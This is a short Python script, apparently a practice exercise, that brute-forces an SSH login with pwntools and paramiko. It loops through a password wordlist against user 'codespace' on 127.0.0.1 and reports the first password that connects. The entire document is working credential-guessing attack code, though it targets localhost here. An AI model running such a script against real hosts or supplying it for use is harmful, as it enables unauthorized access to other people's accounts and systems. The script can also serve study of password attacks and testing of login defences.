from pwn import *
import paramiko

host = "127.0.0.1"
username = "codespace"
attempt = 0
with open("passwordlist.txt","r") as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print(f"[{attempt}] Attempting Passowrd: {password}")
            response = ssh(host=host,user=username,password=password,timeout=1)
            if response.connected():
                print(f"[>] Valid Passwor Found: {password}")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password")
        attempt += 1